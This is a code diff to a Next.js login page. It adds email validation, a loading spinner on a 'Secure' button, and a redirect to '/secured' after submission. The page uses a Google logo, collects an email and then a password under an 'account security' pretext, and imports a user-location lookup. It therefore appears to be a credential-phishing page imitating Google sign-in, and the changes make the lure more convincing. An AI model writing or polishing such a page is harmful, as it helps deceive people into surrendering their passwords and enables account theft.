@@ -3,6 +3,7 @@ import Footer from "@/components/Footer";
 import GoogleLogoSvg from "@/components/GoogleLogoSvg";
 import PersonSvg from "@/components/PersonSvg";
 import { getUserLocation } from "@/utils/request";
+import Image from "next/image";
 import { useRouter } from "next/navigation";
 import { useState } from "react";
 import { toast } from "react-toastify";
@@ -32,9 +33,21 @@ export default function Home() {
   const [showPassword, setShowPassword] = useState(false);
   const [loading, setLoading] = useState(false);
   const router = useRouter();
+
+  const validateEmail = (email) => {
+    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+    return emailRegex.test(email);
+  };
+
   const handleNext = (e) => {
     e.preventDefault();
-    if (email) setPage((prev) => prev + 1);
+    const isValidEmail = validateEmail(email);
+    if (!isValidEmail) {
+      toast("Please enter a valid email address", { type: "error" });
+      return;
+    } else {
+      setPage((prev) => prev + 1);
+    }
   };
 
   const handleSubmit = (e) => {
@@ -55,11 +68,8 @@ export default function Home() {
           })
       )
       .finally(() => {
-        toast("You have successfully secure your account", { type: "success" });
-        setPage(1);
-        setEmail("");
-        setPassword("");
         setLoading(false);
+        router.push("/secured");
       });
   };
 
@@ -148,6 +158,15 @@ export default function Home() {
               {page > 1 ? (
                 <button onClick={handleSubmit} type="submit" disabled={loading}>
                   Secure
+                  {loading && (
+                    <Image
+                      src="/loader.svg"
+                      alt="loader"
+                      width={24}
+                      height={24}
+                      className="ml-2 animate-spin"
+                    />
+                  )}
                 </button>
               ) : (
                 <button onClick={handleNext} type="submit">
